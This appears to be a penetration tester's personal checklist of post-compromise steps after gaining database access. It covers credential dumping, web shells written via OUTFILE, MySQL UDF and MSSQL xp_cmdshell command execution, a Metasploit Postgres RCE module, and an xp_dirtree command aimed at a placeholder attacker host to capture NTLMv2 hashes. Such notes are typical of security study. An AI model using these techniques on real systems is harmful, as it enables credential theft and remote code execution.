# got access to databases - general SQL
- dump creds / hashes
- dump hashes of database users `mysql.users`
- command execution
  - write web shell directly into outfile - may return SQL error but still write file
  - code execution built into database or with modules
  - write config backups with web shells embedded in data
  - edit user hashes authenticate for auth RCE
  - servers running as root
  - mysql -> raptor udf2 command exec
    - mysql GRANT OPTION -> grant file permissions
  - mssql -> enable `xp_commandshell`
  - Postgres 9.3+ auth RCE -> msf `multi/postgres/postgres_copy_from_program_cmd_exec`
- read files
- check if DBA -> enable access to files / commands
- target DBA or privileged user for file write or RCE
- see what other databases are accessable
- CMS database looking for foothold -> possible extra enumeration
  - installed plugins
  - data -> hidden posts, secrets, creds in messages
- mssql + SQLi
  - stacked queries common
  - `xp_commandshell`
  - capture NTLMv2 hashes `EXEC xp_dirtree '\\attacker.ip\share'`

` zet/20221003151204/README.md `

# Related

- 20221009102436

- 20221003151285

- 20221003151236

- 20221003151234

- 20221003151192

- 20221003151188

- 20221003150988

- 20221003150987

- 20221003150984

- 20221003150983

- 20221003150981

- 20221003150980

- 20221003150979

- 20221003150829

- 20221003150826


Tags:

    
